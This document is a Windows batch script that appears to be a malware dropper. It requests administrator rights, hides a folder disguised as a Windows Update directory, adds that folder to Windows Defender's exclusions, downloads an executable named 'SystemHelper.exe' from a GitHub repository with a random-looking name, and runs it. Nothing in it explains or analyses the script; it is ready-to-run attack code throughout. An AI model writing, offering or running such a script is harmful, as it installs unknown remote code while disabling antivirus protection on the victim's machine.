@echo off
setlocal

:: Check admin permissions
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs"
    exit /b
)

:: Create hidden directory in ProgramData
set "hiddenDir=%ProgramData%\Microsoft\WindowsUpdate"
mkdir "%hiddenDir%" 2>nul
attrib +h +s "%hiddenDir%"

:: Add to Windows Defender exclusions
powershell -Command "Add-MpPreference -ExclusionPath '%hiddenDir%'" 2>nul

:: Download and execute file
set "downloadUrl=https://github.com/salamprajjit-alt/0412414124412445235235123313412312/raw/main/SystemHelper.exe"
set "exePath=%hiddenDir%\SystemHelper.exe"

echo Downloading file...
powershell -Command "
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
Invoke-WebRequest -Uri '%downloadUrl%' -OutFile '%exePath%'"

if exist "%exePath%" (
    echo Executing program...
    start "" /high "%exePath%"
) else (
    echo Download failed.
)

endlocal